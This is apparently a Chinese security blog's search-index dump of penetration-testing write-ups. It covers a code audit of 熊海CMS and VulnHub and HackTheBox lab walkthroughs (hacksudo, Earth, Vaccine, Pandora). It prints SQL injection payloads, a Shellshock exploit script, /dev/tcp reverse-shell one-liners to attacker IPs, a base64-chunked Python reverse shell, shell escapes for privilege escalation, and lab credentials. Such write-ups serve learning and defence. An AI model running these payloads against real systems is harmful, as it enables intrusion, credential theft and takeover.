2; $taojian = \"type=2 AND cid=0\"; $biao = \"content\"; } if ($type == 'download') { $fhlink = \"?r=commentlist\u0026type=download\"; $fhname = \"下载评论\"; $type = 3; $taojian = \"type=3\"; $biao = \"download\"; } $pageyema = $fhlink . \"\u0026page=\"; $delete = $_GET['delete']; if ($delete \u003c\u003e \"\") { $query = \"DELETE FROM interaction WHERE id='$delete'\"; $result = mysql_query($query) or die('SQL语句有误：' . mysql_error()); echo \"\u003cscript\u003ealert('亲，ID为\" . $delete . \"的\" . $fhname . \"已经成功删除！');location.href='\" . $fhlink . \"'\u003c/script\u003e\"; exit; } ?\u003e 同上,在后台传递到sql语句中的参数基本上都没有进行过滤,后台的大部分模块都存在sql注入 ","date":"2022-03-11","objectID":"/%E7%86%8A%E6%B5%B7cms/:7:0","tags":null,"title":"熊海CMS","uri":"/%E7%86%8A%E6%B5%B7cms/"},{"categories":["代码审计"],"content":"files/submit.php存在SQL注入 \u003c?php session_start(); require 'inc/conn.php'; $type=addslashes($_GET['type']); $name=$_POST['name']; $mail=$_POST['mail']; $url=$_POST['url']; $content=$_POST['content']; $cid=$_POST['cid']; $ip=$_SERVER[\"REMOTE_ADDR\"]; $tz=$_POST['tz']; if ($tz==\"\"){$tz=0;} $jz=$_POST['jz']; ... $query = \"SELECT * FROM interaction WHERE( mail = '$mail')\"; $result = mysql_query($query) or die('SQL语句有误：'.mysql_error()); $tx = mysql_fetch_array($result); if (!mysql_num_rows($result)){ $touxiang = mt_rand(1,100); }else{ $touxiang = $tx['touxiang']; } 先用'闭合,再用)闭合即可,可以使用报错注入 ' or updatexml(1,concat(0x7e,(select @@version),0x7e),1))# ","date":"2022-03-11","objectID":"/%E7%86%8A%E6%B5%B7cms/:8:0","tags":null,"title":"熊海CMS","uri":"/%E7%86%8A%E6%B5%B7cms/"},{"categories":["代码审计"],"content":"files/content.php存在SQL注入 \u003c?php require 'inc/conn.php'; require 'inc/time.class.php'; $query = \"SELECT * FROM settings\"; $resul = mysql_query($query) or die('SQL语句有误：'.mysql_error()); $info = mysql_fetch_array($resul); $id=addslashes($_GET['cid']); $query = \"SELECT * FROM content WHERE id='$id'\"; $resul = mysql_query($query) or die('SQL语句有误：'.mysql_error()); $content = mysql_fetch_array($resul); $navid=$content['navclass']; $query = \"SELECT * FROM navclass WHERE id='$navid'\"; $resul = mysql_query($query) or die('SQL语句有误：'.mysql_error()); $navs = mysql_fetch_array($resul); //浏览计数 $query = \"UPDATE content SET hit = hit+1 WHERE id=$id\"; @mysql_query($query) or die('修改错误：'.mysql_error()); ?\u003e $query = \"UPDATE content SET hit = hit+1 WHERE id=$id\";没有用'进行闭合,可以进行报错注入 ?r=content\u0026cid=1 and updatexml(1,concat(0x7e,(select @@version),0x7e),1); ","date":"2022-03-11","objectID":"/%E7%86%8A%E6%B5%B7cms/:9:0","tags":null,"title":"熊海CMS","uri":"/%E7%86%8A%E6%B5%B7cms/"},{"categories":["代码审计"],"content":"files/software.php存在SQL注入 \u003c?php require 'inc/conn.php'; require 'inc/time.class.php'; $query = \"SELECT * FROM settings\"; $resul = mysql_query($query) or die('SQL语句有误：' . mysql_error()); $info = mysql_fetch_array($resul); $id = addslashes($_GET['cid']); $query = \"SELECT * FROM download WHERE id='$id'\"; $resul = mysql_query($query) or die('SQL语句有误：' . mysql_error()); $download = mysql_fetch_array($resul); //浏览计数 $query = \"UPDATE download SET hit = hit+1 WHERE id=$id\"; @mysql_query($query) or die('修改错误：' . mysql_error()); ?\u003e 同上 ","date":"2022-03-11","objectID":"/%E7%86%8A%E6%B5%B7cms/:10:0","tags":null,"title":"熊海CMS","uri":"/%E7%86%8A%E6%B5%B7cms/"},{"categories":["代码审计"],"content":"install/index.php存在SQL注入 \u003c?PHP ob_start(); error_reporting(0); header('Content-Type:text/html;charset=utf-8'); if (file_exists('InstallLock.txt')) { echo \"你已经成功安装熊海内容管理系统，如果需要重新安装请删除install目录下的InstallLock.txt\"; exit; } $save = $_POST['save']; $user = $_POST['user']; $password = md5($_POST['password']); $dbhost = $_POST['dbhost']; $dbuser = $_POST['dbuser']; $dbpwd = $_POST['dbpwd']; $dbname = $_POST['dbname']; if ($save \u003c\u003e \"\") { ... include '../inc/db.class.php'; $db = new DBManage($dbhost, $dbuser, $dbpwd, $dbname, 'utf8'); $db-\u003erestore('seacms.sql'); $content = \"\u003c?php \\$DB_HOST='\" . $dbhost . \"'; \\$DB_USER='\" . $dbuser . \"'; \\$DB_PWD='\" . $dbpwd . \"'; \\$DB_NAME='\" . $dbname . \"'; ?\u003e \"; $of = fopen('../inc/conn.info.php', 'w'); if ($of) { fwrite($of, $content); } echo \"MySQL数据库连接配置成功!\u003cbr /\u003e\u003cbr /\u003e\"; $conn = @mysql_connect($dbhost, $dbuser, $dbpwd) or die('数据库连接失败，错误信息：' . mysql_error()); mysql_select_db($dbname) or die('数据库错误，错误信息：' . mysql_error()); mysql_query('SET NAMES UTF8') or die('字符集设置错误' . mysql_error()); $query = \"UPDATE manage SET user='$user',password='$password',name='$user'\"; @mysql_query($query) or die('修改错误：' . mysql_error()); echo \"管理信息已经成功写入!\u003cbr /\u003e\u003cbr /\u003e\"; $content = \"熊海内容管理系统 V1.0\\r\\n\\r\\n安装时间：\" . date('Y-m-d H:i:s'); $of = fopen('InstallLock.txt', 'w'); if ($of) { fwrite($of, $content); } fclose($of); echo \"为防止重复安装，安装锁已经生成!\u003cbr /\u003e\u003cbr /\u003e\"; echo \"\u003cfont color='#006600'\u003e恭喜,熊海网站管理系统已经成功安装！\u003c/font\u003e\"; exit; ob_end_flush(); } ?\u003e $query = \"UPDATE manage SET user='$user',password='$password',name='$user'\";单引号注入,但是由于安装完成后会生成InstallLock.txt防止重复安装,需要去除这个文件才能够利用这一注入点 ","date":"2022-03-11","objectID":"/%E7%86%8A%E6%B5%B7cms/:11:0","tags":null,"title":"熊海CMS","uri":"/%E7%86%8A%E6%B5%B7cms/"},{"categories":["代码审计"],"content":"files/submit.php存在存储型XSS $content = addslashes(strip_tags($content)); //过滤HTML只对内容进行了过滤,而没有对昵称进行过滤,在昵称处插入XSS即可 ","date":"2022-03-11","objectID":"/%E7%86%8A%E6%B5%B7cms/:12:0","tags":null,"title":"熊海CMS","uri":"/%E7%86%8A%E6%B5%B7cms/"},{"categories":["VulnHub"],"content":"https://www.vulnhub.com/entry/hacksudo-thor,733/ ","date":"2022-02-22","objectID":"/vulnhub-hacksudo/:0:0","tags":null,"title":"VulnHub-hacksudo","uri":"/vulnhub-hacksudo/"},{"categories":["VulnHub"],"content":"前期工作 nmap扫描结果 首页有个彩蛋\u003cimg src=\"images/logo.png\" onclick=\"eEgg_func()\" width=\"100\" height=\"100\"\u003e,点击够一定次数把一个网页弹出来,好像没啥用qwq \u003cscript\u003e var old_time = 0; var count = 1; var eEgg_flag = false; var modal = document.getElementById('eEgg_modal'); var footer = document.getElementById('footer'); function eEgg_func(){ var d = new Date(); var n = d.getTime(); var new_time = Math.ceil(n/1000); if ((new_time - old_time) \u003c= 1) { count++; } else { count = 1; } old_time = new_time; if (count \u003e 7 \u0026\u0026 !eEgg_flag) { modal.style.display = \"block\"; eEgg_flag = true; // Timeout setTimeout(function () { modal.style.display = \"none\"; }, 21000); //Timeout text display in the footer var now = new Date().getTime(); var countDownDate = now + 21000; setInterval(function() { // Get todays date and time var now = new Date().getTime(); // Find the distance between now an the count down date var distance = countDownDate - now; // Time calculations for seconds var seconds = Math.floor((distance % (1000 * 60)) / 1000); // Display the result in the element with id=\"demo\" document.getElementById(\"footer\").innerHTML = \"Going back in \"+ seconds + \"s...\"; }, 1000); } } \u003c/script\u003e xray扫描出有个readme.md ... 将文件夹 [net-banking](https://github.com/zakee94/online-banking-system/tree/master/net-banking) 或其中的文件复制到本地主机的位置。例如“/var/www/html”，Ubuntu 中 localhost 的位置。 将 [net_banking.sql](https://github.com/zakee94/online-banking-system/blob/master/net_banking.sql) 数据库导入您的 MySQL 设置。 编辑文件 [connect.php](https://github.com/zakee94/online-banking-system/blob/master/net-banking/connect.php) 并为您的 MySQL 设置提供正确的用户名和密码。 打开浏览器并通过访问主页测试设置是否有效。在浏览器中输入“localhost/home.php”作为访问主页的 URL。 管理员和客户的所有密码和用户名都可以在数据库中找到，即在文件 [net_banking.sql](https://github.com/zakee94/online-banking-system/blob/master/net_banking .sql）。 但是，下面提供了一些重要的用户名和密码： * admin 的用户名为“admin”，密码为“password123”。 * 大多数客户的用户名是他们的“first_name”，密码是他们的“first_name”，后跟“123”。 ... 在作者的github仓库里面找到了数据库中存在的默认用户https://github.com/zakee94/online-banking-system/blob/master/net_banking.sql#L202 用户名salman,密码salman123 在http://192.168.56.106/customer_transactions.php里面的filter存在注入点,1' union select 1,2,3,4,5,6#正常回显 ","date":"2022-02-22","objectID":"/vulnhub-hacksudo/:1:0","tags":null,"title":"VulnHub-hacksudo","uri":"/vulnhub-hacksudo/"},{"categories":["VulnHub"],"content":"sql注入 sqlmap开跑 requests.txt POST /customer_transactions.php HTTP/1.1 Host: 192.168.56.106 Content-Length: 33 Cache-Control: max-age=0 Origin: http://192.168.56.106 Upgrade-Insecure-Requests: 1 DNT: 1 Content-Type: application/x-www-form-urlencoded User-Agent: Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/97.0.4692.71 Safari/537.36 Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9 Referer: http://192.168.56.106/customer_transactions.php Accept-Encoding: gzip, deflate Accept-Language: zh-CN,zh;q=0.9 Cookie: PHPSESSID=jukdfmgi0kkp5adi3fu208fv5r Connection: close search_term=1\u0026date_from=\u0026date_to= sqlmap -r request.txt -p 'search_term' -v 3 --technique U --random-agent --prefix \"'\" --suffix \"#\" --union-cols 6 可以进行文件读写 1' union select 1,'\u003c?php phpinfo();?\u003e',3,4,5,6 into outfile '/tmp/a'# 但是/var/www/html目录可读不可写… ","date":"2022-02-22","objectID":"/vulnhub-hacksudo/:2:0","tags":null,"title":"VulnHub-hacksudo","uri":"/vulnhub-hacksudo/"},{"categories":["VulnHub"],"content":"获取user权限 http://192.168.56.106/admin_login.php以admin和password123成功登录 读取/var/www/html/connect.php文件 \u003c?php $servername = \"localhost\"; // Enter your MySQL username below(default=root) $username = \"thor\"; // Enter your MySQL password below $password = \"password\"; $dbname = \"hacksudo\"; // Create connection $conn = new mysqli($servername, $username, $password, $dbname); // Check connection if ($conn-\u003econnect_error) { header(\"location:connection_error.php?error=$conn-\u003econnect_error\"); die($conn-\u003econnect_error); } ?\u003e 然而并不能直接进行ssh连接 dirsearch扫出来有个cgi-bin 去瞄了眼wp,cgi-bin下有个shell.sh,推测利用方式为cve-2014-6271 用之前写过的一个脚本去利用 import requests url = \"http://192.168.56.106/cgi-bin/shell.sh\" def shell(cmd): headers = {'User-Agent': \"() { :; }; echo; echo; /bin/bash -c '%s'\" % cmd} r = requests.get(url=url, headers=headers, proxies=proxies) print(r.text) if __name__ == '__main__': shell('whoami') sh -i \u003e\u0026 /dev/tcp/192.168.43.185/9001 0\u003e\u00261成功反弹 python3 -c 'import pty;pty.spawn(\"/bin/bash\")'转换成可交互shell ","date":"2022-02-22","objectID":"/vulnhub-hacksudo/:3:0","tags":null,"title":"VulnHub-hacksudo","uri":"/vulnhub-hacksudo/"},{"categories":["VulnHub"],"content":"获取root权限 find / -user root -perm -4000 -print 2\u003e/dev/null /usr/bin/newgrp /usr/bin/sudo /usr/bin/su /usr/bin/umount /usr/bin/chsh /usr/bin/chfn /usr/bin/gpasswd /usr/bin/passwd /usr/bin/mount /usr/lib/dbus-1.0/dbus-daemon-launch-helper /usr/lib/eject/dmcrypt-get-device /usr/lib/openssh/ssh-keysign 存在命令执行 cat hammer.sh #!/bin/bash echo echo \"HELLO want to talk to Thor?\" echo read -p \"Enter Thor Secret Key : \" key read -p \"Hey Dear ! I am $key , Please enter your Secret massage : \" msg $msg 2\u003e/dev/null echo \"Thank you for your precious time!\" 在/home/thor/.ssh/authorized_keys写个公钥 https://gtfobins.github.io/ ","date":"2022-02-22","objectID":"/vulnhub-hacksudo/:4:0","tags":null,"title":"VulnHub-hacksudo","uri":"/vulnhub-hacksudo/"},{"categories":["VulnHub"],"content":"https://www.vulnhub.com/entry/the-planets-earth,755/ ","date":"2022-02-21","objectID":"/vulnhub-earth/:0:0","tags":null,"title":"VulnHub-Earth","uri":"/vulnhub-earth/"},{"categories":["VulnHub"],"content":"前期工作 fping -g 192.168.56.0/24 | grep alive 192.168.56.1 is alive 192.168.56.100 is alive 192.168.56.105 is alive nmap扫描结果 添加192.168.56.105 earth.local 192.168.56.105 terratest.earth.local到/etc/hosts dirsaech扫描到一个admin路径 https://earth.local/admin/ 好像没有注入点 ","date":"2022-02-21","objectID":"/vulnhub-earth/:1:0","tags":null,"title":"VulnHub-Earth","uri":"/vulnhub-earth/"},{"categories":["VulnHub"],"content":"解密 http://earth.local/有一个加密输入框,测试得知是逐字符异或,但是要解密原始的三条密文还需要知道原始异或密钥 37090b59030f11060b0a1b4e0000000000004312170a1b0b0e4107174f1a0b044e0a000202134e0a161d17040359061d43370f15030b10414e340e1c0a0f0b0b061d430e0059220f11124059261ae281ba124e14001c06411a110e00435542495f5e430a0715000306150b0b1c4e4b5242495f5e430c07150a1d4a410216010943e281b54e1c0101160606591b0143121a0b0a1a00094e1f1d010e412d180307050e1c17060f43150159210b144137161d054d41270d4f0710410010010b431507140a1d43001d5903010d064e18010a4307010c1d4e1708031c1c4e02124e1d0a0b13410f0a4f2b02131a11e281b61d43261c18010a43220f1716010d40 3714171e0b0a550a1859101d064b160a191a4b0908140d0e0d441c0d4b1611074318160814114b0a1d06170e1444010b0a0d441c104b150106104b1d011b100e59101d0205591314170e0b4a552a1f59071a16071d44130f041810550a05590555010a0d0c011609590d13430a171d170c0f0044160c1e150055011e100811430a59061417030d1117430910035506051611120b45 2402111b1a0705070a41000a431a000a0e0a0f04104601164d050f070c0f15540d1018000000000c0c06410f0901420e105c0d074d04181a01041c170d4f4c2c0c13000d430e0e1c0a0006410b420d074d55404645031b18040a03074d181104111b410f000a4c41335d1c1d040f4e070d04521201111f1d4d031d090f010e00471c07001647481a0b412b1217151a531b4304001e151b171a4441020e030741054418100c130b1745081c541c0b0949020211040d1b410f090142030153091b4d150153040714110b174c2c0c13000d441b410f13080d12145c0d0708410f1d014101011a050d0a084d540906090507090242150b141c1d08411e010a0d1b120d110d1d040e1a450c0e410f090407130b5601164d00001749411e151c061e454d0011170c0a080d470a1006055a010600124053360e1f1148040906010e130c00090d4e02130b05015a0b104d0800170c0213000d104c1d050000450f01070b47080318445c090308410f010c12171a48021f49080006091a48001d47514c50445601190108011d451817151a104c080a0e5a earth.local中没有robots.txt但是在https://terratest.earth.local/却能够得到robots.txt User-Agent: * Disallow: /*.asp Disallow: /*.aspx Disallow: /*.bat Disallow: /*.c Disallow: /*.cfm Disallow: /*.cgi Disallow: /*.com Disallow: /*.dll Disallow: /*.exe Disallow: /*.htm Disallow: /*.html Disallow: /*.inc Disallow: /*.jhtml Disallow: /*.jsa Disallow: /*.json Disallow: /*.jsp Disallow: /*.log Disallow: /*.mdb Disallow: /*.nsf Disallow: /*.php Disallow: /*.phtml Disallow: /*.pl Disallow: /*.reg Disallow: /*.sh Disallow: /*.shtml Disallow: /*.sql Disallow: /*.txt Disallow: /*.xml Disallow: /testingnotes.* 尝试读取testingnotes.txt Testing secure messaging system notes: *Using XOR encryption as the algorithm, should be safe as used in RSA. *Earth has confirmed they have received our sent messages. *testdata.txt was used to test encryption. *terra used as username for admin portal. Todo: *How do we send our monthly keys to Earth securely? Or should we change keys weekly? *Need to test different key lengths to protect against bruteforce. How long should the key be? *Need to improve the interface of the messaging interface and the admin panel, it's currently very basic. 测试安全消息系统注意事项： *使用 XOR 加密作为算法，在 RSA 中使用应该是安全的。 *地球已确认他们已收到我们发送的消息。 *testdata.txt 用于测试加密。 *terra 用作管理门户的用户名。 去做： *我们如何安全地将我们的每月密钥发送到地球？还是我们应该每周更换密钥？ *需要测试不同的密钥长度以防止暴力破解。钥匙应该多长？ *需要改进消息界面和管理面板的界面，目前非常基础。 testdata.txt内容,长度为403,而第三个密文的长度为806,尝试恢复原始异或密钥 According to radiometric dating estimation and other evidence, Earth formed over 4.5 billion years ago. Within the first billion years of Earth's history, life appeared in the oceans and began to affect Earth's atmosphere and surface, leading to the proliferation of anaerobic and, later, aerobic organisms. Some geological evidence indicates that life may have arisen as early as 4.1 billion years ago. plaintext=\"According to radiometric dating estimation and other evidence, Earth formed over 4.5 billion years ago. Within the first billion years of Earth's history, life appeared in the oceans and began to affect Earth's atmosphere and surface, leading to the proliferation of anaerobic and, later, aerobic organisms. Some geological evidence indicates that life may have arisen as early as 4.1 billion years ago.\" ciphertext=\"2402111b1a0705070a41000a431a000a0e0a0f04104601164d050f070c0f15540d101800000000","date":"2022-02-21","objectID":"/vulnhub-earth/:2:0","tags":null,"title":"VulnHub-Earth","uri":"/vulnhub-earth/"},{"categories":["VulnHub"],"content":"获取user权限 测试得知,存在长度限制(100),同时会判断是否存在ip地址,如果存在则会显示Remote connections are forbidden. 可以利用ipv6绕过 sh -i \u003e\u0026 /dev/tcp/::ffff:c0a8:01d1/9001 0\u003e\u00261 这里是将ipv4地址转换为ipv6地址即::ffff:c0a8:01d1后才能够反弹 我一开始直接用了ifconfig里面的inet6 fe80::6b85:d5c7:e6e8:3877 prefixlen 64 scopeid 0x20\u003clink\u003e的这个ipv6地址,发现不能反弹 看了segmentfault上的这篇关于ipv6介绍的文章才理解 我这里是将一个反弹shell的python文件base64编码后再上传到靶机并解码 echo -n \"aW1wb3J0IHNvY2tldAppbXBvcnQgc3VicHJvY2VzcwppbXBvcnQgb3MKaXA9IjEwLjQ1LjIzNC41\" \u003e /tmp/asdf echo -n \"MyIKcG9ydD04MDAwCnM9c29ja2V0LnNvY2tldChzb2NrZXQuQUZfSU5FVCxzb2NrZXQuU09DS19T\" \u003e\u003e /tmp/asdf echo -n \"VFJFQU0pCnMuY29ubmVjdCgoaXAscG9ydCkpCm9zLmR1cDIocy5maWxlbm8oKSwwKQpvcy5kdXAy\" \u003e\u003e /tmp/asdf echo -n \"KHMuZmlsZW5vKCksMSkKb3MuZHVwMihzLmZpbGVubygpLDIpCnA9c3VicHJvY2Vzcy5jYWxsKFsi\" \u003e\u003e /tmp/asdf echo -n \"L2Jpbi9zaCIsIi1pIl0pCgojcHl0aG9uMyAtYyAnaW1wb3J0IHB0eTtwdHkuc3Bhd24oIi9iaW4v\" \u003e\u003e /tmp/asdf echo -n \"YmFzaCIpJwo=\" \u003e\u003e /tmp/asdf ","date":"2022-02-21","objectID":"/vulnhub-earth/:3:0","tags":null,"title":"VulnHub-Earth","uri":"/vulnhub-earth/"},{"categories":["VulnHub"],"content":"获取root权限 find / -user root -perm -4000 -print 2\u003e/dev/null /usr/bin/chage /usr/bin/gpasswd /usr/bin/newgrp /usr/bin/su /usr/bin/mount /usr/bin/umount /usr/bin/pkexec /usr/bin/passwd /usr/bin/chfn /usr/bin/chsh /usr/bin/at /usr/bin/sudo /usr/bin/reset_root /usr/sbin/grub2-set-bootflag /usr/sbin/pam_timestamp_check /usr/sbin/unix_chkpwd /usr/sbin/mount.nfs /usr/lib/polkit-1/polkit-agent-helper-1 有个reset_root,可能是提权的点 int __cdecl main(int argc, const char **argv, const char **envp) { __int64 v4; // [rsp+3h] [rbp-10BDh] BYREF char v5[9]; // [rsp+Bh] [rbp-10B5h] BYREF int v6; // [rsp+14h] [rbp-10ACh] __int64 v7; // [rsp+18h] [rbp-10A8h] char v8; // [rsp+20h] [rbp-10A0h] __int64 v9[2]; // [rsp+30h] [rbp-1090h] BYREF char v10; // [rsp+40h] [rbp-1080h] char name[17]; // [rsp+50h] [rbp-1070h] BYREF char v12; // [rsp+61h] [rbp-105Fh] char v13[32]; // [rsp+1050h] [rbp-70h] BYREF char v14[32]; // [rsp+1070h] [rbp-50h] BYREF __int64 v15[2]; // [rsp+1090h] [rbp-30h] BYREF char v16; // [rsp+10A0h] [rbp-20h] _DWORD v17[4]; // [rsp+10B0h] [rbp-10h] BYREF strcpy((char *)v17, \"palebluedot\"); v15[0] = 0x810190E07090904LL; v15[1] = 0x555C5D041C161D05LL; v16 = 94; strcpy(v13, \"credentials root:theEarthisflat\"); v17[3] = 0; v9[0] = 0xD064314000C5BLL; v9[1] = 0x27077310B2A194ELL; v10 = 117; v6 = 853571; v7 = 0x620067075B15284ELL; v8 = 7; v4 = 0x20061E4312081C5BLL; strcpy(v5, \"Q%\\a\\x1B\"); magic_cipher((__int64)v15, (__int64)v17, (__int64)v14, 17, 12); v14[17] = 0; puts(\"CHECKING IF RESET TRIGGERS PRESENT...\"); magic_cipher((__int64)v9, (__int64)v14, (__int64)name, 17, 18); v12 = 0; if ( !access(name, 0) ) ++v17[3]; magic_cipher((__int64)\u0026v5[5], (__int64)v14, (__int64)name, 17, 18); v12 = 0; if ( !access(name, 0) ) ++v17[3]; magic_cipher((__int64)\u0026v4, (__int64)v14, (__int64)name, 13, 18); name[13] = 0; if ( !access(name, 0) ) ++v17[3]; if ( v17[3] == 3 ) { puts(\"RESET TRIGGERS ARE PRESENT, RESETTING ROOT PASSWORD TO: Earth\"); setuid(0); system(\"/usr/bin/echo 'root:Earth' | /usr/sbin/chpasswd\"); } else { puts(\"RESET FAILED, ALL TRIGGERS ARE NOT PRESENT.\"); } return 0; } magic_cipher是一个异或加密函数 下断点,动态调试,得到三个name 分别是/dev/shm/kHgTFI5G,/dev/shm/Zw7bV9U5,/tmp/kcM0Wewe 通过反弹shell在靶机中建立这三个文件,从而满足reset_root的条件,从而修改root密码 ","date":"2022-02-21","objectID":"/vulnhub-earth/:4:0","tags":null,"title":"VulnHub-Earth","uri":"/vulnhub-earth/"},{"categories":["HackTheBox"],"content":"前期工作 nmap扫描结果 ","date":"2022-01-11","objectID":"/htb-vaccine/:1:0","tags":null,"title":"HackTheBox-Vaccine","uri":"/htb-vaccine/"},{"categories":["HackTheBox"],"content":"破解zip压缩包 在ftp中存在备份文件 但是要密码,注意到压缩包中存在style.css 同时网站中也存在style.css,可以尝试进行已知明文攻击 注意在压缩style.css时要在linux上进行压缩,否则APCHPR会报错 ","date":"2022-01-11","objectID":"/htb-vaccine/:2:0","tags":null,"title":"HackTheBox-Vaccine","uri":"/htb-vaccine/"},{"categories":["HackTheBox"],"content":"获取root权限 见backup_decrypted \u003c!DOCTYPE html\u003e \u003c?php session_start(); if(isset($_POST['username']) \u0026\u0026 isset($_POST['password'])) { if($_POST['username'] === 'admin' \u0026\u0026 md5($_POST['password']) === \"2cb42f8734ea607eefed3b70af13bbd3\") { $_SESSION['login'] = \"true\"; header(\"Location: dashboard.php\"); } } ?\u003e ... 2cb42f8734ea607eefed3b70af13bbd3反查结果为qwerty789 成功登录 报错ERROR: unterminated quoted string at or near \"'\" LINE 1: Select * from cars where name ilike '%1'%' ^ ?search=1%' union select null,version(),null,null,null--+确认数据库类型为PostgreSQL,PostgreSQL 11.7 (Ubuntu 11.7-0ubuntu0.19.10.1) on x86_64-pc-linux-gnu, compiled by gcc (Ubuntu 9.2.1-9ubuntu2) 9.2.1 20191008, 64-bit ?search=1%' union select null,pg_ls_dir('/var/www/html'),null,null,null--+列出路径 ?search=1%' union select null,pg_read_file('/var/www/html/dashboard.php', 0, 20000),null,null,null--+读取dashboard.php \u003c?php session_start(); if ($_SESSION['login'] !== \"true\") { header(\"Location: index.php\"); die(); } try { $conn = pg_connect(\"host=localhost port=5432 dbname=carsdb user=postgres password=P@s5w0rd!\"); } catch (exception $e) { echo $e-\u003egetMessage(); } if (isset($_REQUEST['search'])) { $q = \"Select * from cars where name ilike '%\" . $_REQUEST[\"search\"] . \"%'\"; $result = pg_query($conn, $q); if (!$result) { die(pg_last_error($conn)); } while ($row = pg_fetch_array($result, NULL, PGSQL_NUM)) { echo \" \u003ctr\u003e \u003ctd class='lalign'\u003e$row[1]\u003c/td\u003e \u003ctd\u003e$row[2]\u003c/td\u003e \u003ctd\u003e$row[3]\u003c/td\u003e \u003ctd\u003e$row[4]\u003c/td\u003e \u003c/tr\u003e\"; } } else { $q = \"Select * from cars\"; $result = pg_query($conn, $q); if (!$result) { die(pg_last_error($conn)); } while ($row = pg_fetch_array($result, NULL, PGSQL_NUM)) { echo \" \u003ctr\u003e \u003ctd class='lalign'\u003e$row[1]\u003c/td\u003e \u003ctd\u003e$row[2]\u003c/td\u003e \u003ctd\u003e$row[3]\u003c/td\u003e \u003ctd\u003e$row[4]\u003c/td\u003e \u003c/tr\u003e\"; } } ?\u003e 利用user=postgres password=P@s5w0rd!成功连接 sudo /bin/vi /etc/postgresql/11/main/pg_hba.conf :set shell=/bin/sh :shell ","date":"2022-01-11","objectID":"/htb-vaccine/:3:0","tags":null,"title":"HackTheBox-Vaccine","uri":"/htb-vaccine/"},{"categories":["HackTheBox"],"content":"前期工作 nmap扫描结果 发现161/udp开放,尝试使用snmpwalk进行读取 ","date":"2022-01-10","objectID":"/htb-pandora/:1:0","tags":null,"title":"HackTheBox-Pandora","uri":"/htb-pandora/"},{"categories":["HackTheBox"],"content":"获取user1权限 sudo nmap -sU -p 161 --script=snmp-processes 10.10.11.136 Starting Nmap 7.80 ( https://nmap.org ) at 2022-01-22 15:27 CST Nmap scan report for 10.10.11.136 Host is up (0.081s latency). PORT STATE SERVICE 161/udp open snmp | snmp-processes: | 1: | Name: systemd | Path: /sbin/init | Params: maybe-ubiquity ... | 838: | Name: cron | Path: /usr/sbin/CRON | Params: -f | 843: | Name: sh | Path: /bin/sh | Params: -c sleep 30; /bin/bash -c '/usr/bin/host_check -u daniel -p HotelBabylon23' | 858: | Name: atd | Path: /usr/sbin/atd | Params: -f | 860: | Name: snmpd | Path: /usr/sbin/snmpd | Params: -LOw -u Debian-snmp -g Debian-snmp -I -smux mteTrigger mteTriggerConf -f -p /run/snmpd.pid | 861: | Name: sshd | Path: sshd: /usr/sbin/sshd -D [listener] 1 of 10-100 startups | 872: | Name: apache2 | Path: /usr/sbin/apache2 | Params: -k start | 897: | Name: agetty | Path: /sbin/agetty | Params: -o -p -- \\u --noclear tty1 linux | 909: | Name: polkitd | Path: /usr/lib/policykit-1/polkitd | Params: --no-debug | 949: | Name: mysqld | Path: /usr/sbin/mysqld | 1131: | Name: host_check | Path: /usr/bin/host_check | Params: -u daniel -p HotelBabylon23 ... | 31386: | Name: sshd | Path: sshd: daniel@pts/0 | 31387: | Name: bash | Path: -bash | 31589: | Name: chisel_1.7.6_li | Path: ./chisel_1.7.6_linux_amd64 | Params: client 10.10.14.21:1234 R:30000:127.0.0.1:80 | 36786: | Name: kworker/0:0-memcg_kmem_cache | 36823: | Name: kworker/1:2-events | 37386: | Name: kworker/1:1-events | 37522: | Name: kworker/u4:0-events_power_efficient | 42454: ... | |_ 71459: Nmap done: 1 IP address (1 host up) scanned in 357.43 seconds 敏感信息/usr/bin/host_check -u daniel -p HotelBabylon23,Params: -u daniel -p HotelBabylon23,chisel_1.7.6_linux_amd64 user.txt在/home/matt目录下,不在/home/daniel ","date":"2022-01-10","objectID":"/htb-pandora/:2:0","tags":null,"title":"HackTheBox-Pandora","uri":"/htb-pandora/"},{"categories":["HackTheBox"],"content":"获取user2权限 find / -user root -perm -4000 -print 2\u003e/dev/null /usr/bin/sudo /usr/bin/pkexec /usr/bin/chfn /usr/bin/newgrp /usr/bin/gpasswd /usr/bin/umount /usr/bin/pandora_backup /usr/bin/passwd /usr/bin/mount /usr/bin/su /usr/bin/fusermount /usr/bin/chsh /usr/lib/openssh/ssh-keysign /usr/lib/dbus-1.0/dbus-daemon-launch-helper /usr/lib/eject/dmcrypt-get-device /usr/lib/policykit-1/polkit-agent-helper-1 /usr/bin/host_check反编译 int __cdecl main(int argc, const char **argv, const char **envp) { int result; // eax if ( argc == 5 ) { puts(\"PandoraFMS host check utility\"); puts(\"Now attempting to check PandoraFMS registered hosts.\"); puts(\"Files will be saved to ~/.host_check\"); if ( system( \"/usr/bin/curl 'http://127.0.0.1/pandora_console/include/api.php?op=get\u0026op2=all_agents\u0026return_type=csv\u0026other_m\" \"ode=url_encode_separator_%7C\u0026user=daniel\u0026pass=HotelBabylon23' \u003e ~/.host_check 2\u003e/dev/null\") ) { printf(\"Host check unsuccessful!\\nPlease check your credentials.\\nTerminating program!\"); result = 1; } else { sleep(0x1B186Eu); puts(\"Host check successful!\\nTerminating program!\"); result = 0; } } else { if ( argc \u003e 4 ) puts(\"Two arguments expected.\"); else puts(\"Ussage: ./host_check -u username -p password.\"); result = 0; } return result; } 在/var/www/有html和pandora ssh -L 80:127.0.0.1:80 daniel@10.10.11.136将端口转发到本地(注意权限) http://127.0.0.1/pandora_console/include/api.php?op=get\u0026op2=all_agents\u0026return_type=csv\u0026other_m%22%22ode=url_encode_separator_%7C\u0026user=daniel\u0026pass=HotelBabylon23 1;localhost.localdomain;192.168.1.42;Created by localhost.localdomain;Linux;;09fbaa6fdf35afd44f8266676e4872f299c1d3cbb9846fbe944772d913fcfc69;3 2;localhost.localdomain;;Pandora FMS Server version 7.0NG.742_FIX_PERL2020;Linux;;localhost.localdomain;3 这个FMS有个sql注入的漏洞https://blog.sonarsource.com/pandora-fms-742-critical-code-vulnerabilities-explained http://127.0.0.1/pandora_console/include/chart_generator.php?session_id=' union SELECT 1,2,'id_usuario|s:5:\"admin\";' as data--+ 以管理员身份登录后,利用CVE-2020-13851进行命令执行 看msf的exp def execute_command(cmd, _opts = {}) print_status('Executing payload...') send_request_cgi({ 'method' =\u003e 'POST', 'uri' =\u003e normalize_uri(target_uri.path, 'ajax.php'), 'cookie' 